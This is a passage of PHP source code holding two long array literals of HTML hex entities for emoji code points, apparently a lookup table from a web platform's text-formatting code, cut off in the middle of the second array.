'&#x270d;&#x1f3ff;', '&#x23;&#x20e3;', '&#x2a;&#x20e3;', '&#x30;&#x20e3;', '&#x31;&#x20e3;', '&#x32;&#x20e3;', '&#x33;&#x20e3;', '&#x34;&#x20e3;', '&#x35;&#x20e3;', '&#x36;&#x20e3;', '&#x37;&#x20e3;', '&#x38;&#x20e3;', '&#x39;&#x20e3;', '&#x1f004;', '&#x1f0cf;', '&#x1f170;', '&#x1f171;', '&#x1f17e;', '&#x1f17f;', '&#x1f18e;', '&#x1f191;', '&#x1f192;', '&#x1f193;', '&#x1f194;', '&#x1f195;', '&#x1f196;', '&#x1f197;', '&#x1f198;', '&#x1f199;', '&#x1f19a;', '&#x1f1e6;', '&#x1f1e7;', '&#x1f1e8;', '&#x1f1e9;', '&#x1f1ea;', '&#x1f1eb;', '&#x1f1ec;', '&#x1f1ed;', '&#x1f1ee;', '&#x1f1ef;', '&#x1f1f0;', '&#x1f1f1;', '&#x1f1f2;', '&#x1f1f3;', '&#x1f1f4;', '&#x1f1f5;', '&#x1f1f6;', '&#x1f1f7;', '&#x1f1f8;', '&#x1f1f9;', '&#x1f1fa;', '&#x1f1fb;', '&#x1f1fc;', '&#x1f1fd;', '&#x1f1fe;', '&#x1f1ff;', '&#x1f201;', '&#x1f202;', '&#x1f21a;', '&#x1f22f;', '&#x1f232;', '&#x1f233;', '&#x1f234;', '&#x1f235;', '&#x1f236;', '&#x1f237;', '&#x1f238;', '&#x1f239;', '&#x1f23a;', '&#x1f250;', '&#x1f251;', '&#x1f300;', '&#x1f301;', '&#x1f302;', '&#x1f303;', '&#x1f304;', '&#x1f305;', '&#x1f306;', '&#x1f307;', '&#x1f308;', '&#x1f309;', '&#x1f30a;', '&#x1f30b;', '&#x1f30c;', '&#x1f30d;', '&#x1f30e;', '&#x1f30f;', '&#x1f310;', '&#x1f311;', '&#x1f312;', '&#x1f313;', '&#x1f314;', '&#x1f315;', '&#x1f316;', '&#x1f317;', '&#x1f318;', '&#x1f319;', '&#x1f31a;', '&#x1f31b;', '&#x1f31c;', '&#x1f31d;', '&#x1f31e;', '&#x1f31f;', '&#x1f320;', '&#x1f321;', '&#x1f324;', '&#x1f325;', '&#x1f326;', '&#x1f327;', '&#x1f328;', '&#x1f329;', '&#x1f32a;', '&#x1f32b;', '&#x1f32c;', '&#x1f32d;', '&#x1f32e;', '&#x1f32f;', '&#x1f330;', '&#x1f331;', '&#x1f332;', '&#x1f333;', '&#x1f334;', '&#x1f335;', '&#x1f336;', '&#x1f337;', '&#x1f338;', '&#x1f339;', '&#x1f33a;', '&#x1f33b;', '&#x1f33c;', '&#x1f33d;', '&#x1f33e;', '&#x1f33f;', '&#x1f340;', '&#x1f341;', '&#x1f342;', '&#x1f343;', '&#x1f344;', '&#x1f345;', '&#x1f346;', '&#x1f347;', '&#x1f348;', '&#x1f349;', '&#x1f34a;', '&#x1f34b;', '&#x1f34c;', '&#x1f34d;', '&#x1f34e;', '&#x1f34f;', '&#x1f350;', '&#x1f351;', '&#x1f352;', '&#x1f353;', '&#x1f354;', '&#x1f355;', '&#x1f356;', '&#x1f357;', '&#x1f358;', '&#x1f359;', '&#x1f35a;', '&#x1f35b;', '&#x1f35c;', '&#x1f35d;', '&#x1f35e;', '&#x1f35f;', '&#x1f360;', '&#x1f361;', '&#x1f362;', '&#x1f363;', '&#x1f364;', '&#x1f365;', '&#x1f366;', '&#x1f367;', '&#x1f368;', '&#x1f369;', '&#x1f36a;', '&#x1f36b;', '&#x1f36c;', '&#x1f36d;', '&#x1f36e;', '&#x1f36f;', '&#x1f370;', '&#x1f371;', '&#x1f372;', '&#x1f373;', '&#x1f374;', '&#x1f375;', '&#x1f376;', '&#x1f377;', '&#x1f378;', '&#x1f379;', '&#x1f37a;', '&#x1f37b;', '&#x1f37c;', '&#x1f37d;', '&#x1f37e;', '&#x1f37f;', '&#x1f380;', '&#x1f381;', '&#x1f382;', '&#x1f383;', '&#x1f384;', '&#x1f385;', '&#x1f386;', '&#x1f387;', '&#x1f388;', '&#x1f389;', '&#x1f38a;', '&#x1f38b;', '&#x1f38c;', '&#x1f38d;', '&#x1f38e;', '&#x1f38f;', '&#x1f390;', '&#x1f391;', '&#x1f392;', '&#x1f393;', '&#x1f396;', '&#x1f397;', '&#x1f399;', '&#x1f39a;', '&#x1f39b;', '&#x1f39e;', '&#x1f39f;', '&#x1f3a0;', '&#x1f3a1;', '&#x1f3a2;', '&#x1f3a3;', '&#x1f3a4;', '&#x1f3a5;', '&#x1f3a6;', '&#x1f3a7;', '&#x1f3a8;', '&#x1f3a9;', '&#x1f3aa;', '&#x1f3ab;', '&#x1f3ac;', '&#x1f3ad;', '&#x1f3ae;', '&#x1f3af;', '&#x1f3b0;', '&#x1f3b1;', '&#x1f3b2;', '&#x1f3b3;', '&#x1f3b4;', '&#x1f3b5;', '&#x1f3b6;', '&#x1f3b7;', '&#x1f3b8;', '&#x1f3b9;', '&#x1f3ba;', '&#x1f3bb;', '&#x1f3bc;', '&#x1f3bd;', '&#x1f3be;', '&#x1f3bf;', '&#x1f3c0;', '&#x1f3c1;', '&#x1f3c2;', '&#x1f3c3;', '&#x1f3c4;', '&#x1f3c5;', '&#x1f3c6;', '&#x1f3c7;', '&#x1f3c8;', '&#x1f3c9;', '&#x1f3ca;', '&#x1f3cb;', '&#x1f3cc;', '&#x1f3cd;', '&#x1f3ce;', '&#x1f3cf;', '&#x1f3d0;', '&#x1f3d1;', '&#x1f3d2;', '&#x1f3d3;', '&#x1f3d4;', '&#x1f3d5;', '&#x1f3d6;', '&#x1f3d7;', '&#x1f3d8;', '&#x1f3d9;', '&#x1f3da;', '&#x1f3db;', '&#x1f3dc;', '&#x1f3dd;', '&#x1f3de;', '&#x1f3df;', '&#x1f3e0;', '&#x1f3e1;', '&#x1f3e2;', '&#x1f3e3;', '&#x1f3e4;', '&#x1f3e5;', '&#x1f3e6;', '&#x1f3e7;', '&#x1f3e8;', '&#x1f3e9;', '&#x1f3ea;', '&#x1f3eb;', '&#x1f3ec;', '&#x1f3ed;', '&#x1f3ee;', '&#x1f3ef;', '&#x1f3f0;', '&#x1f3f3;', '&#x1f3f4;', '&#x1f3f5;', '&#x1f3f7;', '&#x1f3f8;', '&#x1f3f9;', '&#x1f3fa;', '&#x1f3fb;', '&#x1f3fc;', '&#x1f3fd;', '&#x1f3fe;', '&#x1f3ff;', '&#x1f400;', '&#x1f401;', '&#x1f402;', '&#x1f403;', '&#x1f404;', '&#x1f405;', '&#x1f406;', '&#x1f407;', '&#x1f408;', '&#x1f409;', '&#x1f40a;', '&#x1f40b;', '&#x1f40c;', '&#x1f40d;', '&#x1f40e;', '&#x1f40f;', '&#x1f410;', '&#x1f411;', '&#x1f412;', '&#x1f413;', '&#x1f414;', '&#x1f415;', '&#x1f416;', '&#x1f417;', '&#x1f418;', '&#x1f419;', '&#x1f41a;', '&#x1f41b;', '&#x1f41c;', '&#x1f41d;', '&#x1f41e;', '&#x1f41f;', '&#x1f420;', '&#x1f421;', '&#x1f422;', '&#x1f423;', '&#x1f424;', '&#x1f425;', '&#x1f426;', '&#x1f427;', '&#x1f428;', '&#x1f429;', '&#x1f42a;', '&#x1f42b;', '&#x1f42c;', '&#x1f42d;', '&#x1f42e;', '&#x1f42f;', '&#x1f430;', '&#x1f431;', '&#x1f432;', '&#x1f433;', '&#x1f434;', '&#x1f435;', '&#x1f436;', '&#x1f437;', '&#x1f438;', '&#x1f439;', '&#x1f43a;', '&#x1f43b;', '&#x1f43c;', '&#x1f43d;', '&#x1f43e;', '&#x1f43f;', '&#x1f440;', '&#x1f441;', '&#x1f442;', '&#x1f443;', '&#x1f444;', '&#x1f445;', '&#x1f446;', '&#x1f447;', '&#x1f448;', '&#x1f449;', '&#x1f44a;', '&#x1f44b;', '&#x1f44c;', '&#x1f44d;', '&#x1f44e;', '&#x1f44f;', '&#x1f450;', '&#x1f451;', '&#x1f452;', '&#x1f453;', '&#x1f454;', '&#x1f455;', '&#x1f456;', '&#x1f457;', '&#x1f458;', '&#x1f459;', '&#x1f45a;', '&#x1f45b;', '&#x1f45c;', '&#x1f45d;', '&#x1f45e;', '&#x1f45f;', '&#x1f460;', '&#x1f461;', '&#x1f462;', '&#x1f463;', '&#x1f464;', '&#x1f465;', '&#x1f466;', '&#x1f467;', '&#x1f468;', '&#x1f469;', '&#x1f46a;', '&#x1f46b;', '&#x1f46c;', '&#x1f46d;', '&#x1f46e;', '&#x1f46f;', '&#x1f470;', '&#x1f471;', '&#x1f472;', '&#x1f473;', '&#x1f474;', '&#x1f475;', '&#x1f476;', '&#x1f477;', '&#x1f478;', '&#x1f479;', '&#x1f47a;', '&#x1f47b;', '&#x1f47c;', '&#x1f47d;', '&#x1f47e;', '&#x1f47f;', '&#x1f480;', '&#x1f481;', '&#x1f482;', '&#x1f483;', '&#x1f484;', '&#x1f485;', '&#x1f486;', '&#x1f487;', '&#x1f488;', '&#x1f489;', '&#x1f48a;', '&#x1f48b;', '&#x1f48c;', '&#x1f48d;', '&#x1f48e;', '&#x1f48f;', '&#x1f490;', '&#x1f491;', '&#x1f492;', '&#x1f493;', '&#x1f494;', '&#x1f495;', '&#x1f496;', '&#x1f497;', '&#x1f498;', '&#x1f499;', '&#x1f49a;', '&#x1f49b;', '&#x1f49c;', '&#x1f49d;', '&#x1f49e;', '&#x1f49f;', '&#x1f4a0;', '&#x1f4a1;', '&#x1f4a2;', '&#x1f4a3;', '&#x1f4a4;', '&#x1f4a5;', '&#x1f4a6;', '&#x1f4a7;', '&#x1f4a8;', '&#x1f4a9;', '&#x1f4aa;', '&#x1f4ab;', '&#x1f4ac;', '&#x1f4ad;', '&#x1f4ae;', '&#x1f4af;', '&#x1f4b0;', '&#x1f4b1;', '&#x1f4b2;', '&#x1f4b3;', '&#x1f4b4;', '&#x1f4b5;', '&#x1f4b6;', '&#x1f4b7;', '&#x1f4b8;', '&#x1f4b9;', '&#x1f4ba;', '&#x1f4bb;', '&#x1f4bc;', '&#x1f4bd;', '&#x1f4be;', '&#x1f4bf;', '&#x1f4c0;', '&#x1f4c1;', '&#x1f4c2;', '&#x1f4c3;', '&#x1f4c4;', '&#x1f4c5;', '&#x1f4c6;', '&#x1f4c7;', '&#x1f4c8;', '&#x1f4c9;', '&#x1f4ca;', '&#x1f4cb;', '&#x1f4cc;', '&#x1f4cd;', '&#x1f4ce;', '&#x1f4cf;', '&#x1f4d0;', '&#x1f4d1;', '&#x1f4d2;', '&#x1f4d3;', '&#x1f4d4;', '&#x1f4d5;', '&#x1f4d6;', '&#x1f4d7;', '&#x1f4d8;', '&#x1f4d9;', '&#x1f4da;', '&#x1f4db;', '&#x1f4dc;', '&#x1f4dd;', '&#x1f4de;', '&#x1f4df;', '&#x1f4e0;', '&#x1f4e1;', '&#x1f4e2;', '&#x1f4e3;', '&#x1f4e4;', '&#x1f4e5;', '&#x1f4e6;', '&#x1f4e7;', '&#x1f4e8;', '&#x1f4e9;', '&#x1f4ea;', '&#x1f4eb;', '&#x1f4ec;', '&#x1f4ed;', '&#x1f4ee;', '&#x1f4ef;', '&#x1f4f0;', '&#x1f4f1;', '&#x1f4f2;', '&#x1f4f3;', '&#x1f4f4;', '&#x1f4f5;', '&#x1f4f6;', '&#x1f4f7;', '&#x1f4f8;', '&#x1f4f9;', '&#x1f4fa;', '&#x1f4fb;', '&#x1f4fc;', '&#x1f4fd;', '&#x1f4ff;', '&#x1f500;', '&#x1f501;', '&#x1f502;', '&#x1f503;', '&#x1f504;', '&#x1f505;', '&#x1f506;', '&#x1f507;', '&#x1f508;', '&#x1f509;', '&#x1f50a;', '&#x1f50b;', '&#x1f50c;', '&#x1f50d;', '&#x1f50e;', '&#x1f50f;', '&#x1f510;', '&#x1f511;', '&#x1f512;', '&#x1f513;', '&#x1f514;', '&#x1f515;', '&#x1f516;', '&#x1f517;', '&#x1f518;', '&#x1f519;', '&#x1f51a;', '&#x1f51b;', '&#x1f51c;', '&#x1f51d;', '&#x1f51e;', '&#x1f51f;', '&#x1f520;', '&#x1f521;', '&#x1f522;', '&#x1f523;', '&#x1f524;', '&#x1f525;', '&#x1f526;', '&#x1f527;', '&#x1f528;', '&#x1f529;', '&#x1f52a;', '&#x1f52b;', '&#x1f52c;', '&#x1f52d;', '&#x1f52e;', '&#x1f52f;', '&#x1f530;', '&#x1f531;', '&#x1f532;', '&#x1f533;', '&#x1f534;', '&#x1f535;', '&#x1f536;', '&#x1f537;', '&#x1f538;', '&#x1f539;', '&#x1f53a;', '&#x1f53b;', '&#x1f53c;', '&#x1f53d;', '&#x1f549;', '&#x1f54a;', '&#x1f54b;', '&#x1f54c;', '&#x1f54d;', '&#x1f54e;', '&#x1f550;', '&#x1f551;', '&#x1f552;', '&#x1f553;', '&#x1f554;', '&#x1f555;', '&#x1f556;', '&#x1f557;', '&#x1f558;', '&#x1f559;', '&#x1f55a;', '&#x1f55b;', '&#x1f55c;', '&#x1f55d;', '&#x1f55e;', '&#x1f55f;', '&#x1f560;', '&#x1f561;', '&#x1f562;', '&#x1f563;', '&#x1f564;', '&#x1f565;', '&#x1f566;', '&#x1f567;', '&#x1f56f;', '&#x1f570;', '&#x1f573;', '&#x1f574;', '&#x1f575;', '&#x1f576;', '&#x1f577;', '&#x1f578;', '&#x1f579;', '&#x1f57a;', '&#x1f587;', '&#x1f58a;', '&#x1f58b;', '&#x1f58c;', '&#x1f58d;', '&#x1f590;', '&#x1f595;', '&#x1f596;', '&#x1f5a4;', '&#x1f5a5;', '&#x1f5a8;', '&#x1f5b1;', '&#x1f5b2;', '&#x1f5bc;', '&#x1f5c2;', '&#x1f5c3;', '&#x1f5c4;', '&#x1f5d1;', '&#x1f5d2;', '&#x1f5d3;', '&#x1f5dc;', '&#x1f5dd;', '&#x1f5de;', '&#x1f5e1;', '&#x1f5e3;', '&#x1f5e8;', '&#x1f5ef;', '&#x1f5f3;', '&#x1f5fa;', '&#x1f5fb;', '&#x1f5fc;', '&#x1f5fd;', '&#x1f5fe;', '&#x1f5ff;', '&#x1f600;', '&#x1f601;', '&#x1f602;', '&#x1f603;', '&#x1f604;', '&#x1f605;', '&#x1f606;', '&#x1f607;', '&#x1f608;', '&#x1f609;', '&#x1f60a;', '&#x1f60b;', '&#x1f60c;', '&#x1f60d;', '&#x1f60e;', '&#x1f60f;', '&#x1f610;', '&#x1f611;', '&#x1f612;', '&#x1f613;', '&#x1f614;', '&#x1f615;', '&#x1f616;', '&#x1f617;', '&#x1f618;', '&#x1f619;', '&#x1f61a;', '&#x1f61b;', '&#x1f61c;', '&#x1f61d;', '&#x1f61e;', '&#x1f61f;', '&#x1f620;', '&#x1f621;', '&#x1f622;', '&#x1f623;', '&#x1f624;', '&#x1f625;', '&#x1f626;', '&#x1f627;', '&#x1f628;', '&#x1f629;', '&#x1f62a;', '&#x1f62b;', '&#x1f62c;', '&#x1f62d;', '&#x1f62e;', '&#x1f62f;', '&#x1f630;', '&#x1f631;', '&#x1f632;', '&#x1f633;', '&#x1f634;', '&#x1f635;', '&#x1f636;', '&#x1f637;', '&#x1f638;', '&#x1f639;', '&#x1f63a;', '&#x1f63b;', '&#x1f63c;', '&#x1f63d;', '&#x1f63e;', '&#x1f63f;', '&#x1f640;', '&#x1f641;', '&#x1f642;', '&#x1f643;', '&#x1f644;', '&#x1f645;', '&#x1f646;', '&#x1f647;', '&#x1f648;', '&#x1f649;', '&#x1f64a;', '&#x1f64b;', '&#x1f64c;', '&#x1f64d;', '&#x1f64e;', '&#x1f64f;', '&#x1f680;', '&#x1f681;', '&#x1f682;', '&#x1f683;', '&#x1f684;', '&#x1f685;', '&#x1f686;', '&#x1f687;', '&#x1f688;', '&#x1f689;', '&#x1f68a;', '&#x1f68b;', '&#x1f68c;', '&#x1f68d;', '&#x1f68e;', '&#x1f68f;', '&#x1f690;', '&#x1f691;', '&#x1f692;', '&#x1f693;', '&#x1f694;', '&#x1f695;', '&#x1f696;', '&#x1f697;', '&#x1f698;', '&#x1f699;', '&#x1f69a;', '&#x1f69b;', '&#x1f69c;', '&#x1f69d;', '&#x1f69e;', '&#x1f69f;', '&#x1f6a0;', '&#x1f6a1;', '&#x1f6a2;', '&#x1f6a3;', '&#x1f6a4;', '&#x1f6a5;', '&#x1f6a6;', '&#x1f6a7;', '&#x1f6a8;', '&#x1f6a9;', '&#x1f6aa;', '&#x1f6ab;', '&#x1f6ac;', '&#x1f6ad;', '&#x1f6ae;', '&#x1f6af;', '&#x1f6b0;', '&#x1f6b1;', '&#x1f6b2;', '&#x1f6b3;', '&#x1f6b4;', '&#x1f6b5;', '&#x1f6b6;', '&#x1f6b7;', '&#x1f6b8;', '&#x1f6b9;', '&#x1f6ba;', '&#x1f6bb;', '&#x1f6bc;', '&#x1f6bd;', '&#x1f6be;', '&#x1f6bf;', '&#x1f6c0;', '&#x1f6c1;', '&#x1f6c2;', '&#x1f6c3;', '&#x1f6c4;', '&#x1f6c5;', '&#x1f6cb;', '&#x1f6cc;', '&#x1f6cd;', '&#x1f6ce;', '&#x1f6cf;', '&#x1f6d0;', '&#x1f6d1;', '&#x1f6d2;', '&#x1f6d5;', '&#x1f6d6;', '&#x1f6d7;', '&#x1f6dc;', '&#x1f6dd;', '&#x1f6de;', '&#x1f6df;', '&#x1f6e0;', '&#x1f6e1;', '&#x1f6e2;', '&#x1f6e3;', '&#x1f6e4;', '&#x1f6e5;', '&#x1f6e9;', '&#x1f6eb;', '&#x1f6ec;', '&#x1f6f0;', '&#x1f6f3;', '&#x1f6f4;', '&#x1f6f5;', '&#x1f6f6;', '&#x1f6f7;', '&#x1f6f8;', '&#x1f6f9;', '&#x1f6fa;', '&#x1f6fb;', '&#x1f6fc;', '&#x1f7e0;', '&#x1f7e1;', '&#x1f7e2;', '&#x1f7e3;', '&#x1f7e4;', '&#x1f7e5;', '&#x1f7e6;', '&#x1f7e7;', '&#x1f7e8;', '&#x1f7e9;', '&#x1f7ea;', '&#x1f7eb;', '&#x1f7f0;', '&#x1f90c;', '&#x1f90d;', '&#x1f90e;', '&#x1f90f;', '&#x1f910;', '&#x1f911;', '&#x1f912;', '&#x1f913;', '&#x1f914;', '&#x1f915;', '&#x1f916;', '&#x1f917;', '&#x1f918;', '&#x1f919;', '&#x1f91a;', '&#x1f91b;', '&#x1f91c;', '&#x1f91d;', '&#x1f91e;', '&#x1f91f;', '&#x1f920;', '&#x1f921;', '&#x1f922;', '&#x1f923;', '&#x1f924;', '&#x1f925;', '&#x1f926;', '&#x1f927;', '&#x1f928;', '&#x1f929;', '&#x1f92a;', '&#x1f92b;', '&#x1f92c;', '&#x1f92d;', '&#x1f92e;', '&#x1f92f;', '&#x1f930;', '&#x1f931;', '&#x1f932;', '&#x1f933;', '&#x1f934;', '&#x1f935;', '&#x1f936;', '&#x1f937;', '&#x1f938;', '&#x1f939;', '&#x1f93a;', '&#x1f93c;', '&#x1f93d;', '&#x1f93e;', '&#x1f93f;', '&#x1f940;', '&#x1f941;', '&#x1f942;', '&#x1f943;', '&#x1f944;', '&#x1f945;', '&#x1f947;', '&#x1f948;', '&#x1f949;', '&#x1f94a;', '&#x1f94b;', '&#x1f94c;', '&#x1f94d;', '&#x1f94e;', '&#x1f94f;', '&#x1f950;', '&#x1f951;', '&#x1f952;', '&#x1f953;', '&#x1f954;', '&#x1f955;', '&#x1f956;', '&#x1f957;', '&#x1f958;', '&#x1f959;', '&#x1f95a;', '&#x1f95b;', '&#x1f95c;', '&#x1f95d;', '&#x1f95e;', '&#x1f95f;', '&#x1f960;', '&#x1f961;', '&#x1f962;', '&#x1f963;', '&#x1f964;', '&#x1f965;', '&#x1f966;', '&#x1f967;', '&#x1f968;', '&#x1f969;', '&#x1f96a;', '&#x1f96b;', '&#x1f96c;', '&#x1f96d;', '&#x1f96e;', '&#x1f96f;', '&#x1f970;', '&#x1f971;', '&#x1f972;', '&#x1f973;', '&#x1f974;', '&#x1f975;', '&#x1f976;', '&#x1f977;', '&#x1f978;', '&#x1f979;', '&#x1f97a;', '&#x1f97b;', '&#x1f97c;', '&#x1f97d;', '&#x1f97e;', '&#x1f97f;', '&#x1f980;', '&#x1f981;', '&#x1f982;', '&#x1f983;', '&#x1f984;', '&#x1f985;', '&#x1f986;', '&#x1f987;', '&#x1f988;', '&#x1f989;', '&#x1f98a;', '&#x1f98b;', '&#x1f98c;', '&#x1f98d;', '&#x1f98e;', '&#x1f98f;', '&#x1f990;', '&#x1f991;', '&#x1f992;', '&#x1f993;', '&#x1f994;', '&#x1f995;', '&#x1f996;', '&#x1f997;', '&#x1f998;', '&#x1f999;', '&#x1f99a;', '&#x1f99b;', '&#x1f99c;', '&#x1f99d;', '&#x1f99e;', '&#x1f99f;', '&#x1f9a0;', '&#x1f9a1;', '&#x1f9a2;', '&#x1f9a3;', '&#x1f9a4;', '&#x1f9a5;', '&#x1f9a6;', '&#x1f9a7;', '&#x1f9a8;', '&#x1f9a9;', '&#x1f9aa;', '&#x1f9ab;', '&#x1f9ac;', '&#x1f9ad;', '&#x1f9ae;', '&#x1f9af;', '&#x1f9b0;', '&#x1f9b1;', '&#x1f9b2;', '&#x1f9b3;', '&#x1f9b4;', '&#x1f9b5;', '&#x1f9b6;', '&#x1f9b7;', '&#x1f9b8;', '&#x1f9b9;', '&#x1f9ba;', '&#x1f9bb;', '&#x1f9bc;', '&#x1f9bd;', '&#x1f9be;', '&#x1f9bf;', '&#x1f9c0;', '&#x1f9c1;', '&#x1f9c2;', '&#x1f9c3;', '&#x1f9c4;', '&#x1f9c5;', '&#x1f9c6;', '&#x1f9c7;', '&#x1f9c8;', '&#x1f9c9;', '&#x1f9ca;', '&#x1f9cb;', '&#x1f9cc;', '&#x1f9cd;', '&#x1f9ce;', '&#x1f9cf;', '&#x1f9d0;', '&#x1f9d1;', '&#x1f9d2;', '&#x1f9d3;', '&#x1f9d4;', '&#x1f9d5;', '&#x1f9d6;', '&#x1f9d7;', '&#x1f9d8;', '&#x1f9d9;', '&#x1f9da;', '&#x1f9db;', '&#x1f9dc;', '&#x1f9dd;', '&#x1f9de;', '&#x1f9df;', '&#x1f9e0;', '&#x1f9e1;', '&#x1f9e2;', '&#x1f9e3;', '&#x1f9e4;', '&#x1f9e5;', '&#x1f9e6;', '&#x1f9e7;', '&#x1f9e8;', '&#x1f9e9;', '&#x1f9ea;', '&#x1f9eb;', '&#x1f9ec;', '&#x1f9ed;', '&#x1f9ee;', '&#x1f9ef;', '&#x1f9f0;', '&#x1f9f1;', '&#x1f9f2;', '&#x1f9f3;', '&#x1f9f4;', '&#x1f9f5;', '&#x1f9f6;', '&#x1f9f7;', '&#x1f9f8;', '&#x1f9f9;', '&#x1f9fa;', '&#x1f9fb;', '&#x1f9fc;', '&#x1f9fd;', '&#x1f9fe;', '&#x1f9ff;', '&#x1fa70;', '&#x1fa71;', '&#x1fa72;', '&#x1fa73;', '&#x1fa74;', '&#x1fa75;', '&#x1fa76;', '&#x1fa77;', '&#x1fa78;', '&#x1fa79;', '&#x1fa7a;', '&#x1fa7b;', '&#x1fa7c;', '&#x1fa80;', '&#x1fa81;', '&#x1fa82;', '&#x1fa83;', '&#x1fa84;', '&#x1fa85;', '&#x1fa86;', '&#x1fa87;', '&#x1fa88;', '&#x1fa90;', '&#x1fa91;', '&#x1fa92;', '&#x1fa93;', '&#x1fa94;', '&#x1fa95;', '&#x1fa96;', '&#x1fa97;', '&#x1fa98;', '&#x1fa99;', '&#x1fa9a;', '&#x1fa9b;', '&#x1fa9c;', '&#x1fa9d;', '&#x1fa9e;', '&#x1fa9f;', '&#x1faa0;', '&#x1faa1;', '&#x1faa2;', '&#x1faa3;', '&#x1faa4;', '&#x1faa5;', '&#x1faa6;', '&#x1faa7;', '&#x1faa8;', '&#x1faa9;', '&#x1faaa;', '&#x1faab;', '&#x1faac;', '&#x1faad;', '&#x1faae;', '&#x1faaf;', '&#x1fab0;', '&#x1fab1;', '&#x1fab2;', '&#x1fab3;', '&#x1fab4;', '&#x1fab5;', '&#x1fab6;', '&#x1fab7;', '&#x1fab8;', '&#x1fab9;', '&#x1faba;', '&#x1fabb;', '&#x1fabc;', '&#x1fabd;', '&#x1fabf;', '&#x1fac0;', '&#x1fac1;', '&#x1fac2;', '&#x1fac3;', '&#x1fac4;', '&#x1fac5;', '&#x1face;', '&#x1facf;', '&#x1fad0;', '&#x1fad1;', '&#x1fad2;', '&#x1fad3;', '&#x1fad4;', '&#x1fad5;', '&#x1fad6;', '&#x1fad7;', '&#x1fad8;', '&#x1fad9;', '&#x1fada;', '&#x1fadb;', '&#x1fae0;', '&#x1fae1;', '&#x1fae2;', '&#x1fae3;', '&#x1fae4;', '&#x1fae5;', '&#x1fae6;', '&#x1fae7;', '&#x1fae8;', '&#x1faf0;', '&#x1faf1;', '&#x1faf2;', '&#x1faf3;', '&#x1faf4;', '&#x1faf5;', '&#x1faf6;', '&#x1faf7;', '&#x1faf8;', '&#x203c;', '&#x2049;', '&#x2122;', '&#x2139;', '&#x2194;', '&#x2195;', '&#x2196;', '&#x2197;', '&#x2198;', '&#x2199;', '&#x21a9;', '&#x21aa;', '&#x231a;', '&#x231b;', '&#x2328;', '&#x23cf;', '&#x23e9;', '&#x23ea;', '&#x23eb;', '&#x23ec;', '&#x23ed;', '&#x23ee;', '&#x23ef;', '&#x23f0;', '&#x23f1;', '&#x23f2;', '&#x23f3;', '&#x23f8;', '&#x23f9;', '&#x23fa;', '&#x24c2;', '&#x25aa;', '&#x25ab;', '&#x25b6;', '&#x25c0;', '&#x25fb;', '&#x25fc;', '&#x25fd;', '&#x25fe;', '&#x2600;', '&#x2601;', '&#x2602;', '&#x2603;', '&#x2604;', '&#x260e;', '&#x2611;', '&#x2614;', '&#x2615;', '&#x2618;', '&#x261d;', '&#x2620;', '&#x2622;', '&#x2623;', '&#x2626;', '&#x262a;', '&#x262e;', '&#x262f;', '&#x2638;', '&#x2639;', '&#x263a;', '&#x2640;', '&#x2642;', '&#x2648;', '&#x2649;', '&#x264a;', '&#x264b;', '&#x264c;', '&#x264d;', '&#x264e;', '&#x264f;', '&#x2650;', '&#x2651;', '&#x2652;', '&#x2653;', '&#x265f;', '&#x2660;', '&#x2663;', '&#x2665;', '&#x2666;', '&#x2668;', '&#x267b;', '&#x267e;', '&#x267f;', '&#x2692;', '&#x2693;', '&#x2694;', '&#x2695;', '&#x2696;', '&#x2697;', '&#x2699;', '&#x269b;', '&#x269c;', '&#x26a0;', '&#x26a1;', '&#x26a7;', '&#x26aa;', '&#x26ab;', '&#x26b0;', '&#x26b1;', '&#x26bd;', '&#x26be;', '&#x26c4;', '&#x26c5;', '&#x26c8;', '&#x26ce;', '&#x26cf;', '&#x26d1;', '&#x26d3;', '&#x26d4;', '&#x26e9;', '&#x26ea;', '&#x26f0;', '&#x26f1;', '&#x26f2;', '&#x26f3;', '&#x26f4;', '&#x26f5;', '&#x26f7;', '&#x26f8;', '&#x26f9;', '&#x26fa;', '&#x26fd;', '&#x2702;', '&#x2705;', '&#x2708;', '&#x2709;', '&#x270a;', '&#x270b;', '&#x270c;', '&#x270d;', '&#x270f;', '&#x2712;', '&#x2714;', '&#x2716;', '&#x271d;', '&#x2721;', '&#x2728;', '&#x2733;', '&#x2734;', '&#x2744;', '&#x2747;', '&#x274c;', '&#x274e;', '&#x2753;', '&#x2754;', '&#x2755;', '&#x2757;', '&#x2763;', '&#x2764;', '&#x2795;', '&#x2796;', '&#x2797;', '&#x27a1;', '&#x27b0;', '&#x27bf;', '&#x2934;', '&#x2935;', '&#x2b05;', '&#x2b06;', '&#x2b07;', '&#x2b1b;', '&#x2b1c;', '&#x2b50;', '&#x2b55;', '&#x3030;', '&#x303d;', '&#x3297;', '&#x3299;', '&#xe50a;');
    $permastruct = array('&#x1f004;', '&#x1f0cf;', '&#x1f170;', '&#x1f171;', '&#x1f17e;', '&#x1f17f;', '&#x1f18e;', '&#x1f191;', '&#x1f192;', '&#x1f193;', '&#x1f194;', '&#x1f195;', '&#x1f196;', '&#x1f197;', '&#x1f198;', '&#x1f199;', '&#x1f19a;', '&#x1f1e6;', '&#x1f1e8;', '&#x1f1e9;', '&#x1f1ea;', '&#x1f1eb;', '&#x1f1ec;', '&#x1f1ee;', '&#x1f1f1;', '&#x1f1f2;', '&#x1f1f4;', '&#x1f1f6;', '&#x1f1f7;', '&#x1f1f8;', '&#x1f1f9;', '&#x1f1fa;', '&#x1f1fc;', '&#x1f1fd;', '&#x1f1ff;', '&#x1f1e7;', '&#x1f1ed;', '&#x1f1ef;', '&#x1f1f3;', '&#x1f1fb;', '&#x1f1fe;', '&#x1f1f0;', '&#x1f1f5;', '&#x1f201;', '&#x1f202;', '&#x1f21a;', '&#x1f22f;', '&#x1f232;', '&#x1f233;', '&#x1f234;', '&#x1f235;', '&#x1f236;', '&#x1f237;', '&#x1f238;', '&#x1f239;', '&#x1f23a;', '&#x1f250;', '&#x1f251;', '&#x1f300;', '&#x1f301;', '&#x1f302;', '&#x1f303;', '&#x1f304;', '&#x1f305;', '&#x1f306;', '&#x1f307;', '&#x1f308;', '&#x1f309;', '&#x1f30a;', '&#x1f30b;', '&#x1f30c;', '&#x1f30d;', '&#x1f30e;', '&#x1f30f;', '&#x1f310;', '&#x1f311;', '&#x1f312;', '&#x1f313;', '&#x1f314;', '&#x1f315;', '&#x1f316;', '&#x1f317;', '&#x1f318;', '&#x1f319;', '&#x1f31a;', '&#x1f31b;', '&#x1f31c;', '&#x1f31d;', '&#x1f31e;', '&#x1f31f;', '&#x1f320;', '&#x1f321;', '&#x1f324;', '&#x1f325;', '&#x1f326;', '&#x1f327;', '&#x1f328;', '&#x1f329;', '&#x1f32a;', '&#x1f32b;', '&#x1f32c;', '&#x1f32d;', '&#x1f32e;', 